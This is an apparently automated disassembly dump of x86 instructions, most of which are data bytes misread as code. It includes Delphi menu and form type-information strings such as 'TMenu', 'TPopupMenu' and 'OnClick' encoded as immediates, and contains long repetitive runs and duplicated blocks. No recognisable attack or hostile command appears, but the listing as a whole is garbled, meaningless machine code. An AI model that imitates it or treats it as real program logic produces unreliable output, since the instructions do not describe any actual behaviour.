inc esp
add [ eax + 0x34 ] dh
inc esp
add [ eax - 0x4bffbbcc ] dl
inc [ ebx ]
mov al 0x34
inc esp
add [ esi + edi * 8 - 0x13fffbd ] bh
inc ebx
add ah cl
xor al 0x44
add al dh
xor al 0x44
add [ eax ] dl
xor eax 0x35300044
inc esp
add [ edx + esi ] cl
inc esp
add [ edi ] cl
push esp
dec ebp
outsb
jne r-xdata
inc ecx
add [ eax + 0x35 ] dl
outsd
je r-xdata
dec ebp
outsb
je r-xdata
outsb
add ah dh
adc [ eax ] al
in al dx
mov eax 0x41
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
or [ edx ] bl
push esp
inc ecx
jbe r-xdata
je r-xdata
jb r-xdata
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
add eax 0x74646957
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
outsb
je r-xdata
cmp al 0x10
sar ah 0x1f
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
outsd
inc esi
insb
add al 0x8
push es
push ebx
outsb
jb r-xdata
je r-xdata
add ah dh
adc [ eax ] al
add al 0x8
push es
push ebx
outsb
insd
inc ebp
jbe r-xdata
jne r-xdata
mov [ edi ] ds
inc esp
add [ ebx ] al
or eax 0x6e654d54
dec ebp
outsb
jne r-xdata
inc eax
add [ eax + esi - 0x5c97ffc0 ] ah
inc ecx
inc esp
add [ eax + eax ] bl
add [ eax ] al
inc eax
add [ ebx + 0x441f44c0 ] cl
add [ ebx ] al
adc [ ebp + ecx * 2 + 0x65 ] edx
outsb
add ah dh
adc [ eax ] al
in al dx
mov eax 0x103c0041
inc eax
add [ eax + edx ] bh
dec ecx
outsb
dec ebp
outsb
jne r-xdata
outsb
je r-xdata
add al dh
xor [ eax + eax - 0x64 ] eax
mov [ 0x34080041 ] eax
add al 0x8
push es
push ebx
outsb
jb r-xdata
sub_44208c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x21
inc esp
add [ eax + 0x21 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
and [ eax + eax + 0x62 ] eax
and [ eax + eax - 0x54 ] eax
add [ eax ] al
add [ ecx ] ch
inc ecx
add [ edx + 0x41 ] bh
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x35f80040 ] ah
inc esp
add [ esi + ebx * 2 + 0x3c080044 ] al
inc esp
add [ esi + edi + 0x41 ] bl
add [ eax + 0x3a ] dl
inc esp
add ah bh
pop esi
inc esp
add [ edi + ebx * 4 + 0x41 ] ch
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x357c0041 ] bl
inc esp
add ah cl
push eax
inc esp
add [ esi + edi + 0x44 ] bl
add [ edx + edx * 2 + 0x44 ] bh
add al ch
pop ecx
inc esp
add [ edi + edx * 2 + 0x58dc0044 ] ah
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
add [ edi ] al
add bh ch
sub_44241c
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070014 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ja r-xdata
imul eax [ eax + eax - 0x70 ] 0x78004469
insd
inc esp
add [ 0x6e654d54 ] al
jne r-xdata
add [ edi + ebx * 4 + 0x41 ] ch
add [ 0x654d6e4f ] cl
popad
je r-xdata
add [ eax ] al
add [ esp - 0x5d83ffbc ] ch
inc ecx
and eax 0x5070044
push esp
dec ebp
outsb
jl r-xdata
jb r-xdata
xor al 0x25
inc esp
add [ ebp + 0x44 ] ah
insd
pop eax
push ds
inc esp
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
in al dx
add [ edi + ebx * 4 + 0x41 ] ch
jne r-xdata
pop es
add eax 0x6e654d54
and al 0x44
add [ eax ] ch
and al [ ecx ]
add eax [ eax ]
add eax 0x756e654d
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and eax 0x25640044
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x68940041 ] bl
inc esp
add [ eax + 0x71 ] al
inc esp
inc esp
dec ecx
je r-xdata
inc ecx
add [ edx + 0x41 ] bh
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
add [ esi + esi * 2 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + 0x1400441f ] cl
jbe r-xdata
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
and eax 0x25600044
inc esp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
add [ esi + esi * 2 + 0x44 ] dh
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
sar [ eax ] 0x26
inc esp
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0xec756e65
insb
and [ eax + eax + 0x34 ] eax
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050002 ] al
je r-xdata
add [ ecx + 0x44 ] ch
add [ eax + eax ] dh
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
lahf
inc ecx
inc esp
insd
lea eax [ eax ]
clc
and al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x25640044 ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x69300040 ] ah
inc esp
xor eax [ eax ]
rcr [ ebx + 0x33340041 ] 0x1
ja r-xdata
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4065646f
dec eax
outsd
je r-xdata
jne r-xdata
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x68940041 ] bl
inc esp
add [ eax + 0x71 ] al
inc esp
add [ eax ] dh
ja r-xdata
insb
lahf
inc ecx
jae r-xdata
insd
add [ ecx + ebp * 2 + 0x71700044 ] al
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x69300040 ] ah
inc esp
add [ eax + 0x3f ] al
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
add [ eax + 0x71 ] bl
inc esp
add ah dh
jno r-xdata
inc eax
add ah ch
and eax 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ esi ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
inc esp
add [ eax ] ah
add [ eax ] al
lodsb [ esi ]
and al 0x44
add [ edx + 0x41 ] bh
add [ esi + 0x25 ] al
inc esp
add [ edx + 0x25 ] bl
inc esp
add [ eax ] bl
add [ eax ] al
sub al 0x21
je r-xdata
adc [ eax ] al
inc eax
add [ eax ] al
jns r-xdata
insd
popad
jae r-xdata
pop es
add [ esi ] al
je r-xdata
add [ eax + 0x3f ] al
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
add [ eax + 0x71 ] bl
inc esp
add ah dh
jno r-xdata
xor eax [ eax ]
sub [ ebx ] dh
inc eax
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
xor [ ecx + 0x44 ] ch
jae r-xdata
insd
rcr [ esi ] 0x1
inc esp
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
pop es
inc esp
add [ eax ] cl
add bh bh
mov eax 0x1004471
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
inc eax
mov [ edi ] bl
inc esp
add [ esi + esi * 2 ] dh
inc esp
add [ esi + esi * 2 + 0x44 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
jae r-xdata
outsd
dec ecx
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
call [ esi + esi * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
inc eax
add [ ecx ] al
add bh bh
mov al 0x75
inc esp
add [ ecx ] al
dec ebp
jb r-xdata
je r-xdata
outsb
je r-xdata
popad
sbb [ gs : 0x300041 ] cl
add bh bh
pushfd
jne r-xdata
add [ eax ] ch
inc esp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x6004427 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9465646f
sbb eax 0x500044
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
push [ eax + 0x1004475 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
add [ esi + ebp * 2 + 0x44 ] dl
add [ eax - 0x80000000 ] al
sub [ eax + eax - 0x73 ] al
inc eax
add al dl
sub [ eax + eax ] al
add [ eax ] al
add [ eax ] al
outsd
les esp [ edi ]
inc esp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
add al 0x28
inc esp
add [ ebx ] al
jo r-xdata
inc ebx
push 0x65676e61
nop
test [ edi ] ah
inc esp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
jb r-xdata
push eax
outsd
add [ edi + ebx * 4 + 0x41 ] ch
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x7d140041 ] bl
inc esp
add [ eax + 0x71 ] al
inc esp
or eax 0x6f42616d
insd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
outsb
je r-xdata
ja r-xdata
add [ eax ] al
jo r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ esi + esi * 2 ] dh
inc esp
add [ esi + esi * 2 + 0x44 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add [ eax + esi + 0x7d880040 ] ah
inc esp
add [ eax + 0x3f ] al
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
add [ eax + 0x71 ] bl
inc esp
add ah dh
jno r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp ] dl
inc esp
add [ eax ] bh
add [ eax ] al
lodsb [ esi ]
and al 0x44
add [ edx + 0x41 ] bh
outsd
inc edx
outsd
je r-xdata
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
and [ edi ] 0x44
add [ esi ] al
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ esi + esi * 2 ] dl
inc esp
add [ esi + esi * 2 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
outsd
insd
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al al
daa
inc esp
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
pop es
dec eax
outsd
je r-xdata
jno r-xdata
sub [ eax + eax + 0x60 ] al
and eax 0x100044
add eax 0x756e654d
jae r-xdata
jl r-xdata
jo r-xdata
and al 0x29
inc esp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
outsd
insb
sub [ eax + eax + 0x6 ] al
je r-xdata
jne r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
jl r-xdata
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ eax ] cl
dec edi
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add bh bh
add [ eax ] eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
imul eax [ eax ] 0x1ff00
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
jns r-xdata
add [ eax ] al
jmp [ eax ]
add [ ecx + ebp * 2 + 0x71700044 ] al
inc esp
add [ ebp + edi * 2 + 0x7e740044 ] bh
inc esp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
mov [ edi ] bl
inc esp
add [ eax + 0x60004427 ] al
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc ecx
andps xmm1 [ ebp + 0x65 ]
outsb
sub [ eax + eax + 0x3 ] al
xor eax [ eax ]
rcr [ ebx + 0x33340041 ] 0x1
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp ] ah
inc esp
add [ eax ] al
je r-xdata
outsd
dec esp
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ esi ] al
je r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
push cs
push eax
popad
push [ eax + 0x1004475 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
inc eax
pop es
inc esp
add [ eax ] cl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf465646f
or eax 0x7dd00041
inc esp
add al bl
jge r-xdata
or eax 0x300041
add bh bh
pushfd
jne r-xdata
hlt
mov [ edi ] bl
inc esp
outsb
add eax 0x756e654d
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jo r-xdata
inc ebx
push 0x65676e61
pushad
push cs
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc065646f
daa
inc esp
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ecx
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
je r-xdata
outsb
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
ja r-xdata
jb r-xdata
sub [ eax + eax + 0x69 ] al
add [ eax ] al
[ ecx ]
add bh bh
mov eax 0x1004471
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
add [ esi + ebp * 2 + 0x44 ] dl
add [ eax - 0x80000000 ] al
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
shl [ ebx + ebp + 0x44 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx ] ch
inc esp
add [ eax + eax ] dl
add [ eax ] al
in al 0x13
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x36e40040 ] ah
inc ecx
add [ eax - 0x37ffbec8 ] cl
cmp al [ ecx ]
cmp [ edi ] dh
inc ecx
add [ edi + esi + 0x778c0041 ] dh
inc esp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add ah ah
adc eax [ ecx ]
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
outsb
xchg esp eax
sbb eax 0x500044
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_437a5c
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
inc edx
add [ edi + 0x27640042 ] al
inc edx
add [ eax + 0x27 ] dl
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
and [ edi ] ah
sub eax [ eax + eax + 0x8 ]
add [ eax ] al
add al ah
and eax 0x33200042
inc eax
add [ ebx + esi ] ch
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x27200040 ] ah
imul esi [ ebx + 0x74 ] 0x442be090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_442550
inc esp
add [ eax + 0x78004469 ] dl
insd
inc esp
add [ 0x6e654d54 ] al
jne r-xdata
add [ eax ] al
add [ esp - 0x5d83ffbc ] ch
inc ecx
and eax 0x5070044
push esp
dec ebp
outsb
in al dx
add [ edi + ebx * 4 + 0x41 ] ch
jne r-xdata
pop es
add eax 0x6e654d54
and al 0x44
add [ eax ] ch
and al [ ecx ]
add eax [ eax ]
add eax 0x756e654d
jae r-xdata
add [ esi + esi * 2 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + 0x1400441f ] cl
jbe r-xdata
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
and eax 0x25600044
inc esp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
add [ esi + esi * 2 + 0x44 ] dh
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
sar [ eax ] 0x26
inc esp
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0xec756e65
insb
and [ eax + eax + 0x34 ] eax
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050002 ] al
je r-xdata
add [ ecx + 0x44 ] ch
add [ eax + eax ] dh
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4065646f
dec eax
outsd
je r-xdata
jne r-xdata
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x68940041 ] bl
inc esp
add [ eax + 0x71 ] al
inc esp
add [ eax ] dh
ja r-xdata
insb
lahf
inc ecx
jae r-xdata
insd
add [ ecx + ebp * 2 + 0x71700044 ] al
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x69300040 ] ah
inc esp
add [ eax + 0x3f ] al
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
add [ eax + 0x71 ] bl
inc esp
add ah dh
jno r-xdata
inc eax
add ah ch
and eax 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ esi ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
inc esp
add [ eax ] ah
add [ eax ] al
lodsb [ esi ]
and al 0x44
add [ edx + 0x41 ] bh
adc [ eax ] al
inc eax
add [ eax ] al
jns r-xdata
insd
popad
jae r-xdata
pop es
add [ esi ] al
je r-xdata
pop es
inc esp
add [ eax ] cl
add bh bh
mov eax 0x1004471
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
inc eax
mov [ edi ] bl
inc esp
add [ esi + esi * 2 ] dh
inc esp
add [ esi + esi * 2 + 0x44 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
jae r-xdata
outsd
dec ecx
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
call [ esi + esi * 2 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
inc eax
add [ ecx ] al
add bh bh
mov al 0x75
inc esp
add [ ecx ] al
dec ebp
jb r-xdata
je r-xdata
outsb
je r-xdata
popad
sbb [ gs : 0x300041 ] cl
add bh bh
pushfd
jne r-xdata
add [ eax ] ch
inc esp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x6004427 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9465646f
sbb eax 0x500044
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
push [ eax + 0x1004475 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
add [ esi + ebp * 2 + 0x44 ] dl
add [ eax - 0x80000000 ] al
sub [ eax + eax - 0x73 ] al
inc eax
add al dl
sub [ eax + eax ] al
add [ eax ] al
add [ eax ] al
outsd
les esp [ edi ]
inc esp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
add al 0x28
inc esp
add [ ebx ] al
jo r-xdata
inc ebx
push 0x65676e61
nop
test [ edi ] ah
inc esp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
jb r-xdata
push eax
outsd
add [ edi + ebx * 4 + 0x41 ] ch
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x7d140041 ] bl
inc esp
add [ eax + 0x71 ] al
inc esp
or eax 0x6f42616d
insd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
outsb
je r-xdata
ja r-xdata
add [ eax ] al
jo r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ esi + esi * 2 ] dh
inc esp
add [ esi + esi * 2 + 0x44 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add [ eax + esi + 0x7d880040 ] ah
inc esp
add [ eax + 0x3f ] al
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
add [ eax + 0x71 ] bl
inc esp
add ah dh
jno r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp ] dl
inc esp
add [ eax ] bh
add [ eax ] al
lodsb [ esi ]
and al 0x44
add [ edx + 0x41 ] bh
outsd
inc edx
outsd
je r-xdata
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax + eax ] al
